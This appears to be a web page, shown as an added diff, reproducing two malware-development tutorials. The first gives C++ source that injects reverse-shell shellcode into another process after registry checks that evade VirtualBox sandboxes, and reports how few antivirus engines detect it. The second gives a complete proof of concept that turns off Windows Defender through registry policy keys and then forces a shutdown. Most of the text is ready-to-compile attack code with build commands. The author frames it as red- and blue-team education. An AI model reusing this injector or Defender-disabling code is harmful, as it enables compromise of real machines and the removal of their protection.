+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+// reverse shell payload (without encryption)
+unsigned char my_payload[] =
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+
+unsigned int my_payload_len = sizeof(my_payload);
+int reg_key_ex(HKEY hKeyRoot, char* lpSubKey) {
+HKEY hKey = nullptr;
+LONG ret = RegOpenKeyExA(hKeyRoot, lpSubKey, 0,
+KEY_READ, &amp;hKey);
+if (ret == ERROR_SUCCESS) {
+RegCloseKey(hKey);
+return TRUE;
+}
+return FALSE;
+}
+int reg_key_compare(HKEY hKeyRoot, char* lpSubKey,
+char* regVal, char* compare) {
+HKEY hKey = nullptr;
+LONG ret;
+char value[1024];
+DWORD size = sizeof(value);
+ret = RegOpenKeyExA(hKeyRoot, lpSubKey, 0, KEY_READ,
+&amp;hKey);
+if (ret == ERROR_SUCCESS) {
+RegQueryValueExA(hKey, regVal, NULL, NULL,
+(LPBYTE)value, &amp;size);
+if (ret == ERROR_SUCCESS) {
+if (strcmp(value, compare) == 0) {
+return TRUE;
+}
+}
+}
+return FALSE;
+}
+int main(int argc, char* argv[]) {
+HANDLE ph; // process handle
+HANDLE rt; // remote thread
+PVOID rb; // remote buffer
+if (reg_key_ex(HKEY_LOCAL_MACHINE,
+"HARDWARE\\ACPI\\FADT\\VBOX__")) {
+printf("VirtualBox VM reg path value detected :(\n");
+return -2;
+}
+if (reg_key_compare(HKEY_LOCAL_MACHINE,
+
+"SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
+"SystemProductName", "VirtualBox")) {
+printf("VirtualBox VM reg key value detected :(\n");
+return -2;
+}
+if (reg_key_compare(HKEY_LOCAL_MACHINE,
+"SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
+"BiosVersion", "VirtualBox")) {
+printf("VirtualBox VM BIOS version detected :(\n");
+return -2;
+}
+// parse process ID
+printf("PID: %i", atoi(argv[1]));
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
+DWORD(atoi(argv[1])));
+// allocate memory buffer for remote process
+rb = VirtualAllocEx(ph, NULL, my_payload_len,
+(MEM_RESERVE | MEM_COMMIT),
+PAGE_EXECUTE_READWRITE);
+// "copy" data between processes
+WriteProcessMemory(ph, rb, my_payload,
+my_payload_len, NULL);
+// our process start new thread
+rt = CreateRemoteThread(ph, NULL, 0,
+(LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
+CloseHandle(ph);
+return 0;
+}
+As you can see it’s just classic payload injection with some VM VirtualBox detection
+tricks via Windows Registry.
+Check path: HKLM\HARDWARE\ACPI\FADT\VBOX_:
+
+Enumerating reg key SystemProductName from
+HKLM\SYSTEM\CurrentControlSet\Control\SystemInformation
+and compare with VirtualBox string:
+
+and BIOS version key BiosVersion from same path:
+
+Note that in all cases key names are case-insensitive.
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile this malware hack.cpp: i686-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and run (Windows 10 x64 in my case):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to upload to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/e4d265297f08a5769d2f61aafb3040779c5f31f6 99e66ad259e66d62f1bacb03/detection So 8 of 68 AV engines detect our file as malicious If we delve into the investigate of the real-life malware and scenarios, we, of course, will find many other specified registry paths and keys. I hope this section spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. evasion techniques by check point software technologies ltd classic payload injection AV engines evasion part 1 AV engines evasion part 2 AV engines evasion part 3 AV engines evasion part 4 AV engines evasion part 5 source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">60. malware AV evasion: part 7. Disable Windows Defender. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is the result of self-researching one of the most common tricks in the malware in the wild. windows defender The anti-malware software Windows Defender (now known as Microsoft Defender Antivirus) protects your computer from external threats. Microsoft has developed the antivirus to safeguard Windows 10 computers from virus threats. This antivirus is preinstalled on all Windows 10 editions. To avoid possible detection of their malware/tools and activities, adversaries may modify or disable security tools. For example Windows Defender.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to try disable Windows Defender Antivirus via modifying Windows registry. First of all, it is important to remember that disabling requires administrator rights. In active mode, Microsoft Defender Antivirus serves as the device’s primary antivirus program. Threats are remedied and detected threats are listed in your organization’s security reports and Windows Security application. To disable all this you just need to modify the registry keys: LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">if (res == ERROR_SUCCESS) {
+RegSetValueEx(key, "DisableAntiSpyware", 0,
+REG_DWORD, (const BYTE*)&amp;disable, sizeof(disable));
+
+RegCreateKeyEx(key, "Real-Time Protection", 0, 0,
+REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &amp;new_key, 0);
+RegSetValueEx(new_key, "DisableRealtimeMonitoring", 0,
+REG_DWORD, (const BYTE*)&amp;disable, sizeof(disable));
+RegSetValueEx(new_key, "DisableBehaviorMonitoring", 0,
+REG_DWORD, (const BYTE*)&amp;disable, sizeof(disable));
+RegSetValueEx(new_key, "DisableScanOnRealtimeEnable", 0,
+REG_DWORD, (const BYTE*)&amp;disable, sizeof(disable));
+RegSetValueEx(new_key, "DisableOnAccessProtection", 0,
+REG_DWORD, (const BYTE*)&amp;disable, sizeof(disable));
+RegSetValueEx(new_key, "DisableIOAVProtection", 0,
+REG_DWORD, (const BYTE*)&amp;disable, sizeof(disable));
+RegCloseKey(key);
+RegCloseKey(new_key);
+}
+But as I wrote earlier, this requires admin rights, for this we create a function which
+check this:
+// check for admin rights
+bool isUserAdmin() {
+bool isElevated = false;
+HANDLE token;
+TOKEN_ELEVATION elev;
+DWORD size;
+if (OpenProcessToken(GetCurrentProcess(),
+TOKEN_QUERY, &amp;token)) {
+if (GetTokenInformation(token, TokenElevation,
+&amp;elev, sizeof(elev), &amp;size)) {
+isElevated = elev.TokenIsElevated;
+}
+}
+if (token) {
+CloseHandle(token);
+token = NULL;
+}
+return isElevated;
+}
+Since Windows Vista, UAC has been a crucial feature for mitigating some risks associated with privilege elevation. Under UAC, local Administrators group accounts have two
+access tokens, one with standard user privileges and the other with administrator privileges. All processes (including the Windows explorer - explorer.exe) are launched
+using the standard token, which restricts the process’s rights and privileges. If the user
+desires elevated privileges, he may select “run as Administrator” to execute the process.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This opt-in grants the process all administrative privileges and rights.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">A script or executable is typically run under the standard user token due to UAC access token filtering, unless it is “run as Administrator” in elevated privilege mode. As a developer or hacker, it is essential to understand the mode in which you are operating. So, full PoC script to disable Windows Defender is something like:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+disable windows defender dirty PoC
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/06/05/malware-av-evasion-7.html
+*/
+#include &lt;cstdio&gt;
+#include &lt;windows.h&gt;
+// check for admin rights
+bool isUserAdmin() {
+bool isElevated = false;
+HANDLE token;
+TOKEN_ELEVATION elev;
+DWORD size;
+if (OpenProcessToken(GetCurrentProcess(),
+TOKEN_QUERY,
+&amp;token)) {
+if (GetTokenInformation(token, TokenElevation,
+&amp;elev, sizeof(elev), &amp;size)) {
+isElevated = elev.TokenIsElevated;
+}
+}
+if (token) {
+CloseHandle(token);
+token = NULL;
+}
+return isElevated;
+}
+// disable defender via registry
+int main(int argc, char* argv[]) {
+HKEY key;
+HKEY new_key;
+DWORD disable = 1;
+if (!isUserAdmin()) {
+printf("please, run as admin.\n");
+return -1;
+
+}
+LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0,
+KEY_ALL_ACCESS, &amp;key);
+if (res == ERROR_SUCCESS) {
+RegSetValueEx(key, "DisableAntiSpyware", 0,
+REG_DWORD, (const BYTE*)&amp;disable, sizeof(disable));
+RegCreateKeyEx(key, "Real-Time Protection", 0,
+0, REG_OPTION_NON_VOLATILE,
+KEY_ALL_ACCESS, 0, &amp;new_key, 0);
+RegSetValueEx(new_key, "DisableRealtimeMonitoring",
+0, REG_DWORD, (const BYTE*)&amp;disable, sizeof(disable));
+RegSetValueEx(new_key, "DisableBehaviorMonitoring",
+0, REG_DWORD, (const BYTE*)&amp;disable, sizeof(disable));
+RegSetValueEx(new_key, "DisableScanOnRealtimeEnable",
+0, REG_DWORD, (const BYTE*)&amp;disable, sizeof(disable));
+RegSetValueEx(new_key, "DisableOnAccessProtection",
+0, REG_DWORD, (const BYTE*)&amp;disable, sizeof(disable));
+RegSetValueEx(new_key, "DisableIOAVProtection",
+0, REG_DWORD, (const BYTE*)&amp;disable, sizeof(disable));
+RegCloseKey(key);
+RegCloseKey(new_key);
+}
+printf("perfectly disabled :)\n");
+printf("press any key to restart to apply them.\n");
+system("pause");
+system("C:\\Windows\\System32\\shutdown /s /t 0");
+return 1;
+}
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. First of all, check our defender:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and check registry keys: reg query "HKLM\Software\Policies\Microsoft\Windows Defender" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, we have standard registry keys. Then, let’s go to compile our script from attacker’s machine: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And run it on the victim’s machine: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">According to the logic of the our program, the machine turns off. Then, turn on it again and check: reg query "HKLM\Software\Policies\Microsoft\Windows Defender" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For correctness, check via Windows Defender Security Center:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is worked perfectly! But of course, this trick is not new, nowadays threat actors may tamper with artifacts deployed and utilized by security tools. Security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Adversaries may</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">unhook or otherwise modify these features added by tools to avoid detection. This trick is used by Maze and Pysa ransomwares in the wild. For the next part, I’ll learn and research a trick, the point of which is to deprive the antivirus process of privileges, thanks to which it can check files for malware. MITRE ATT&CK. Impair Defenses: Disable or Modify Tools Gorgon Group H1N1 Malware Maze ransomware Pysa ransomware source code on github</p></main></body></html>
